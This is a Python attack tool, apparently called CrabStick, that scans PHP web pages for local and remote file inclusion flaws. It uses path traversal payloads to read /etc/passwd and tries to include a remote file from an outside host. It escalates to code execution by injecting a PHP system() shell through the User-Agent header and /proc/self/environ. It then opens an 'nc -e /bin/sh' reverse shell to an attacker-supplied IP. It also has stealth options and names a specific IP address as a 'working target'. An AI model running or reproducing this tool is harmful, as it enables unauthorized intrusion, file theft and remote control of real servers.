import requests, argparse, sys, time, datetime, random, os
from optparse import OptionParser
from urllib.parse import urlparse


__author__ = "Hack_Hut"

# pip install requests, beautifulsoup4
# ---------------------------------------------------------------------- getting arguments

parser = OptionParser()
parser.add_option("-u", "--url", dest="url", help="URL of target", metavar="http://www.somesite.com/index.php?page=")
parser.add_option("--crawl", action="store_true", dest="crawl", default=False, help="Crawl website enabled")
parser.add_option("--verbose", "-v", action="store_true", dest="verbose", default=False, help="Display more information")
parser.add_option("-d", "--dork", action="store_true", dest="dork", help="Search for pages using search engines",
                  metavar="'.php?page='")
parser.add_option("-c", "--cookie", dest="cookie", help="Cookie for authentication",
                  metavar="CP=H2; Geolocation=Crabland")
parser.add_option("-a", "--random-agent", action="store_true", dest="agent", help="Turns random user agents on")
parser.add_option("-f", "--file", dest="file", help="File to be included default is /etc/passwd",
                  metavar="/etc/passwd")
parser.add_option("-k", "--key", dest="key", help="Search key for checking if file is included",
                  metavar="root:x", default="root:x")
parser.add_option("-r", "--remote", dest="remote", help="Enable testing of remote file inclusion", default=True)
parser.add_option("-s", "--stealth", dest="stealth", help="Enable random timing to become more stealthy",
                  default=False, action="store_true")
parser.add_option("-p", "--proxy", dest="proxy", help="Redirect data through a HTTP proxy",
                  default=False, metavar="http://10.45.16.8:80")
(options, args) = parser.parse_args()
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}
# ---------------------------------------------------------------------- getting arguments

url = options.url
crawl = options.crawl
dork = options.dork
cookie = options.cookie
agent = options.agent
file = options.file
key = options.key
remote = options.remote
stealth = options.stealth
verbose = options.verbose
proxy = options.proxy
proxy = {'http': proxy}
if options.cookie:
    cookies = {}
    temp = options.cookie
    co = temp.split(';')
    for x in range(0, len(co)):
        temp = co[x].split('=')
        cookies[temp[0]] = temp[1]
else:
    cookies = {}
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
           'Connection': 'keep-alive',
           'Accept-Encoding': 'gzip, deflate, sdch',
           'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6'
            }


def main():
    banner()

    if url is None and dork is None:
        time(1, "Please supply a target")
    if dork:
        pass
    else:
        if testURLisup():
            time(3, "Target up")
            Testlfi()
        else:
            time(1, "Could not establish an error free connection to target")
            time(1, "If you're using a proxy is it accepting connections or need authentication")


def Testlfi():
    parametersList = getPara()
    payloadList = gen(file)
    rfipayload = ['http://www.hackhut.co.uk/12f1cc9abc11c47fe264917d26067223.php',
                  'http://www.hackhut.co.uk/12f1cc9abc11c47fe264917d26067223.php%00']
    test = []
    LFI = False
    RFI = False
    vulnURL = "False"
    Previous_status = 0
    pre = True

    for para in range(0, len(parametersList)):
        for pay in range(0, len(payloadList)):
            current = parametersList[para].split('=')
            current = current[1]
            temp = url.replace(current, payloadList[pay])
            test.append(temp)

    if verbose:
        time(1, "Requests to be sent")
        for m in range(0, len(test)):
            print("    ", test[m])
        time(1, "Requests to be sent")
        print(65*'-')

    for req in range(0, len(test)):
        r = openURL(test[req], headers)

        try:
            status = r.status_code
        except AttributeError as e:
            time(1, str(e))
            continue
        if "Warning</b>:  include(" in r.text and pre:
            pre = False
            time(3, "Prerequisite tests show target might be vulnerable")

        elif "root:x" in r.text:
            if verbose:
                print(r.text)
            banner2("LFI found at " + test[req])
            LFI = True
            if status == Previous_status:
                time(1, "Searching in blind mode")
            break
        Previous_status = status


    if not LFI:
        print(65*'-')
        time(1, "LFI not found")
        print(65 * '-')
    else:
        pay = getFiles()
        if pay:
            for x in range(0, len(pay)):
                grab = test[req].strip('etc/passwd') + pay[x]
                r = openURL(grab, headers)
                if r.status_code == 200:

                    time(3, "Downloaded file:" + pay[x])

        print(65 * '-')
        time(3, "Trying to escalate attack to remote code execution by injecting php code into user agents and request proc/self/environ")
        print(65 * '-')
        RCEEnvironUA(test[req])

    print(65*'-')
    time(3, "Testing RFI")
    for para in range(0, len(parametersList)):
        for pay in range(0, len(rfipayload)):
            current = parametersList[para].split('=')
            current = current[1]
            temp = url.replace(current, rfipayload[pay])
            r = openURL(temp, headers)
            if r and "12f1cc9abc11c47fe264917d26067223test" in r.text:
                RFI = True
                print(65 * '-')
                banner2("RFI found at " + temp)
                break
    if not RFI:
        time(1, "Target does not seem vulnerable to RFI")
        print(65 * '-')


def getFiles():
    time(2, "Would you like to try and get other files?")
    temp = input("(Y/n):    ")
    if temp != "n":
        f = open('Payload.txt', 'r')
        payloads = []
        for lines in f:
            temp = lines.replace('^', '')
            print(temp.strip('\n'))
        f.close()
        f = open('Payload.txt', 'r')
        print(65*'-')
        time(2, "What OS is the server")
        print("\n1:Windows\n2:Linux\n3:OSX\n4:Unknown (Too lazy to do an nmap scan)")
        temp = input("1/2/3/4  :")
        print('\n')
        if "1" in temp:
            for lines in f:
                if "WIND    ^" in lines:
                    if lines == "\n":
                        continue
                    x = lines.split("^")
                    x = x[1].strip('\n')
                    payloads.append(x)

        if "2" in temp:
            for lines in f:
                if "LINUX   ^" in lines:
                    if lines == "\n":
                        continue
                    x = lines.split("^")
                    x = x[1].strip('\n')
                    payloads.append(x)

        if "3" in temp:
            for lines in f:
                if "OSX     ^" in lines:
                    if lines == "\n":
                        continue
                    x = lines.split("^")
                    x = x[1].strip('\n')
                    payloads.append(x)

        else:
            for lines in f:
                if lines == "\n":
                    continue
                x = lines.split("^")
                x = x[1].strip('\n')
                payloads.append(x)
        return payloads
    else:
        return False


def RCEEnvironUA(temp):
    """Tests for RCE via tampering user agents"""
    iden = "do i smell remote code execution"
    temp = temp.replace('etc/passwd', 'proc/self/environ&cmd=')
    cmd = "echo%20%22do%20i%20smell%20remote%20code%20execution%22"
    temp2 = temp + cmd
    header2 = headers
    header2['user-agent'] = "<?php system($_GET['cmd']); ?>"
    r = openURL(temp2, header2)
    if iden in r.text:
        banner2("Remote code execution found by editing user agents at " + temp )
        time(3, "Creating telnet reverse shell")
        ip = input("Enter your IP address:                        : ")
        port = input("Enter local port for target to connect back to: ")
        time(3, "Remember to start a listener in another shell")
        input("Hit enter when listen is created")
        cmd = "nc+-e+%2Fbin%2Fsh+" + ip + "+" + port
        try:
            r = openURL(temp + cmd, header2)
            time(2, "Shell closed")
        except KeyboardInterrupt:
            sys.exit()


    else:
        time(1, "Target does not seem vulnerable to RCE via user agent tampering")
        return False


def time(outcome, printme):
    """Function that returns a string to print to reduce lines of code needed for formating"""
    out = ""
    if outcome == 1:
        out = '[-]  ' + "[{0}] ". format(datetime.datetime.now()) + printme
    if outcome == 2:
        out = '[ ]  ' + "[{0}] ". format(datetime.datetime.now()) + printme
    if outcome == 3:
        out = '[+]  ' + "[{0}] ". format(datetime.datetime.now()) + printme
    print(out)


def openURL(TESTurl, headers):
    try:
        if verbose:
            time(2, "Trying " + TESTurl)
        r = requests.get(TESTurl, headers=headers, proxies=proxy, cookies=cookies)
        status = str(r.status_code)
        if status[:1] != str(2):
            if verbose:
                time(1, "Received status code:" + status)
        else:
            if verbose:
                time(3, "Received status code:" + status)
            return r
    except KeyboardInterrupt:
        time(1, "User skipped connection test")
        time(1, "Do you want to continue with URL?")
        temp = input("q/y/N\n")
        if temp == "N":
            return False
        if temp == "q":
            exit()
    except requests.exceptions.RequestException as e:
        time(1, str(e))
        return False


def gen(file):
    """Generates a list of payloads ready for URI injection"""
    if file:
        UserPayload = payloads(file)
        time(3, "Payloads generated")
        if verbose:
            print(65 * '-')
            print(UserPayload.payload)
            print(65 * '-')
        payload = UserPayload.payload
    else:
        linuxDefaultPayload = payloads('etc/passwd')
        time(3, "Payload generated")
        if verbose:
            print(65 * '-')
            print(linuxDefaultPayload.payload)
            print(65 * '-')
        payload = linuxDefaultPayload.payload

    return payload


def getPara():
    """Returns a a list of parameters ready for injection"""
    global url
    TESTurl = urlparse(url)
    listOfQuery = TESTurl.query.split('&')
    newList = []
    for x in range(0, len(listOfQuery)):
        try:
            temp = listOfQuery[x].split('=')
            newList.append(temp[1])
        except IndexError:
            time(1, "No injection point found")
            exit()
    return listOfQuery


def testURLisup():
    """"Checks the target is defined and parsed then generates payload to test LFI and RFI against """
    global url

    # Checking that the URL is not malformed
    # -----------------------------------------
    time(2, "Getting everything ready")
    print(65*'-')
    temp1 = "true"
    temp2 = "true"

    if str(url[:11]) != "http://www.":
        temp1 = "false"
    if str(url[:12]) != "https://www.":
        temp2 = "false"
    if temp1 == "false" and temp2 == "false":
        temp = url[:6]
        if temp != "http://":
            url2 = "http://" + url
        else:
            url2 = "www." + url
        time(1, "You provided a bad defined url, does this URL look correct\nY/n\n")
        print(url2)
        temp = input()
        if temp == "y":
            url = url2

    TESTurl = urlparse(url)
    time(3, str(TESTurl.netloc) + " looks good defined")
    time(3, 'Testing connection to ' + TESTurl.netloc)

    # ----------------------------------------
    # Checking that the server is up and good defined URI
    # ----------------------------------------
    try:
        time(2, "Trying " + TESTurl.scheme + "://" + TESTurl.netloc) #-------------------------------------
        r = requests.get(TESTurl.scheme + "://" + TESTurl.netloc, headers=headers, proxies=proxy)
        status = str(r.status_code)
        if status[:1] != str(2):
            time(1, "Received status code:" + status)
            temp = input("y/N\n")
            if temp != "y":
                return False
        else:
            time(3, "Received status code:" + status)
            return True

    except KeyboardInterrupt:
        time(1, "User skipped connection test")
        time(1, "Do you want to continue with URL?")
        temp = input("y/N\n")
        if temp != "y":
            return False
    except requests.exceptions.RequestException as e:
        time(1, str(e))
        return False


def banner():
    """Bad-ass banner that makes the crabsticks hard"""
    print("         ,__,")
    print("    (/__/\oo/\__(/")
    print("      _/\/__\/\_")
    print("       _/    \_ ")
    print("_________              ___.     _________ __   __        __    ")
    print("\_   ___ \HACK_HUT____ \_ |__  /   _____//  |_|__| ____ |  | __")
    print("/    \  \/\_  __ \__  \ | __ \ \_____  \\   __\  |/ ___\|  |/ /")
    print("\     \____|  | \// __ \| \_\ \/        \|  | |  \  \___|    < ")
    print(" \______  /|__|  (______/_____/_________/|__| |__|\_____>__|_ \ ")
    print("        \/              A tool for HTTP file inclusion exploits")
    print(65 * "-")
    print("Type:    CrabStick.py --help")
    print("For help")
    print("for --url please type http or https")
    print(65 * "-")
    print("working target: http://140.113.1.99/includes/include_once.php?include_file=")
    print(65 * "-")
    print("TIP: type %%##%% to place an alternative injection point for payload")
    print('Example: --url="https://www.192.86.0.1/index.php?file=%%##%%&ID=1"\n')
    print(65*'-')


def banner2(printSTR):
    print(65*'-')
    print("[+]  " + "[{0}] ".format(datetime.datetime.now()) + "(V)(°,,,,°)(V) WE DID IT")
    time(3, printSTR)
    print(65*'-')


def urlEncode(url):
    """Encodes the url"""
    # Used to encode URL
    url = url.replace('?', '%3F')
    url = url.replace(':', '%3A')
    url = url.replace('=', '%3D')
    url = url.replace('/', '%2F')
    return str(url)


class payloads:
    def __init__(self, payload):
        payloadlist = []
        for x in range(0, 7):
            temp = (x * '../')
            temp2 = temp + payload
            payloadlist.append(temp2)

        for x in range(0, len(payloadlist)):
            temp = payloadlist[x] + "%00"
            payloadlist.append(temp)

        self.payload = payloadlist


if __name__ == main():
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()

